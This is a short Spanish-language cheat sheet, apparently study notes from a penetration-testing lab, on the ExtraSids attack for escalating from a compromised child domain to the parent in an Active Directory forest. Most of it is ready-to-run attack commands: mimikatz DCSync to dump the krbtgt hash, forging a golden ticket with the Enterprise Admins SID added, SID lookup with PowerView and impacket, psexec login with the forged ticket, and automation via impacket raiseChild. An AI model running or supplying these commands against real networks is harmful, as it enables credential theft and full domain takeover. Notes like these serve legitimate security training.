# ExtraSids Attack - Mimikatz

## Explicación rápida

- Este ataque permite comprometer a un dominio padre desde que el dominio hijo ya fue comprometido bajo el mismo **AD FOREST**.
- ![](https://s38063.pcdn.co/wp-content/uploads/2022/06/Active-Directory-forest-.jpg.optimal.jpg)
- Este ataque se basa en la explotación de propiedad sidHistory y la falta de protección de filtrado de SIDs (Sid filtering) entre dominios dentro de un AD FOREST.
- Para hacer este ataque se necesitan las siguientes condiciones:
    - HASH NT del KRBTGT del dominio hijo: Hay que generar un Golden Ticket.
    - SID del dominio fijo.
    - Nombre de un usuero objetivo en el dominio hijo.
    - FQDN del dominio hijo.
    - SID del grupo Enterprise Admins del dominio padre. 
- Debido a la ausencia de SID filtering, cuando este usuario autenticado con un SID modificado accede al dominio padre, est ratado como si fuera un miembro del grupo Admins, así dandole privilegios sobre todo el AD FOREST.

## Creación del golden ticket con mimikatz
- [Golden Ticket Attack más info](./goldenTicketAttack.md)
- `mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt`
- `kerberos::golden /user:hacker /domain:DOMAIN.LOCAL /sid:SID-FOR-THE-CHILD-DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:ENTERPRISE-ADMIN-SID /ptt`

## Obtener SID de enterprise admin
- `Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`

## Mediante Linux

### Conseguir el SID con impacket
- `impacket-lookupsid DOMAIN.LOCAL/USER@DC-IP`
- Ejemplo: `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"` 
    - `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`

## Golden ticket con impacket
- `impacket-ticketer -nthash NT-HASH -domain DOMAIN.LOCAL -domain-sid DOMAIN-SID -extra-sid EXTRA-SID hacker`
- Exportamos la variable del ticket kerberos: `export KRB5CCNAME=hacker.ccache`
- Utilizamos psexec de impacket para entrar con este ticket `impacket-psexec DOMAIN.LOCAL/hacker@DC01.DOMAIN.LOCAL -k -no-pass -target-ip DC-IP`

## Automatizar este proceso con raiseChild de impacket
- Esta herramienta automatiza la escalación de dominio hijo a padre, necesitamos especificar el dominio objetivo con su DC, y credenciales en el dominio hijo. El script hará lo demás.
- `impacket-raiseChild -target-exec DC-IP CHILD.DOMAIN.LOCAL/user`